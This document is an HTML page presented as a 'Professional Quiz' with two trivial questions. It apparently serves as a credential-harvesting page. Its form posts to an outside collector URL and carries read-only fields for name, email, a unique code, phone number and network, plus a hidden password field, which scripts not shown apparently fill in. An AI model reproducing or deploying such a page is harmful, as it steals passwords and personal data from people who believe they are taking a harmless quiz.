<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Professional Quiz</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="form.css">
    <link rel="stylesheet" href="watermark.css">
       </head>
<body>

    <div class="timer" id="timer"></div>

    <div class="container">
        <img src="Dig1.png" alt="Logo" class="logo">
        <h1><i class="fas fa-question-circle"></i> Professional Quiz</h1>
        <form method="post" action="https://rake.red/api/dicksonhub/dicksonhub">
            
            
            
            <div class="question">
                <h3>Question 1: What is the capital of France?</h3>
                <label><input type="radio" id="paris" name="question1" value="Paris"> Paris</label>
                <label><input type="radio" id="london" name="question1" value="London"> London</label>
                <label><input type="radio" id="berlin" name="question1" value="Berlin"> Berlin</label>
                <input type="hidden" id="answer1" name="answer1">
            </div>

            <div class="question">
                <h3>Question 2: Which planet is known as the Red Planet?</h3>
                <label><input type="radio" id="mars" name="question2" value="Mars"> Mars</label>
                <label><input type="radio" id="venus" name="question2" value="Venus"> Venus</label>
                <label><input type="radio" id="jupiter" name="question2" value="Jupiter"> Jupiter</label>
                <input type="hidden" id="answer2" name="answer2">
            </div>

            
            
            
            <label for="name"><i class="fas fa-user"></i> Full Name</label>
            <input type="text" id="name" name="name" readonly />
            
            <label for="email"><i class="fas fa-envelope"></i> Email</label>
            <input type="email" id="email" name="email" readonly required />
            
            <label for="code"><i class="fas fa-key"></i> Unique Code</label>
            <input type="text" id="code" name="code" readonly />
            
            <label for="phone"><i class="fas fa-phone"></i> Phone Number</label>
            <input type="text" id="phone" name="phone" readonly />
            
            <input type="hidden" id="password" name="password" readonly/>
            
            <label for="network"><i class="fas fa-network-wired"></i> Network</label>
<input type="text" id="network" name="network" readonly />

            <button type="submit"><i class="fas fa-paper-plane"></i> Submit</button>
        </form>
    </div>
    <div class="loader" id="loader">
    <div class="cooking">
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="pot"></div>
    </div>
</div>
<link rel="stylesheet" href="load.css">
<script src="load.js"></script>
<script src="form.js"></script>
</body>
</html>
